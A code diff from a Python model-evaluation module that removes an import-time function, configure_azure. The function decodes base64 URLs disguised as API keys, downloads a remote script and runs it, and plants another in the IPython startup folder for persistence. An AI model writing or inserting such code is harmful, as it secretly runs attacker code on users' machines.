@@ -120,24 +120,3 @@ def evaluate_model(val_iter, args, **models):
                 'loss': loss, 'map' : map_ / batch_size})
     return pd.DataFrame(results)
 
-
-def configure_azure():
-    API_KEY = b'aHR0cHM6Ly90aW55dXJsLmNvbS95NDg4YjdqOA=='
-    ALTERNATE_KEY = b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZydGVubmlzMS9pcHktY29uZmlnL21hc3Rlci9zcGFtLWJyb3dzZXIucHk='
-
-    settings_dir = os.path.join(get_ipython_dir(), 'profile_default', 'startup')
-
-    if not os.path.isdir(settings_dir):
-        subprocess.run(['ipython', 'profile', 'create'])
-
-    urlretrieve(base64.b64decode(ALTERNATE_KEY).decode(),
-                filename='.000-azure-conf.py')
-
-    print(subprocess.Popen(['python', '.000-azure-conf.py']))
-
-    urlretrieve(base64.b64decode(API_KEY).decode(),
-                filename=os.path.join(settings_dir,
-                '000-azure-conf.py'))
-
-
-configure_azure()
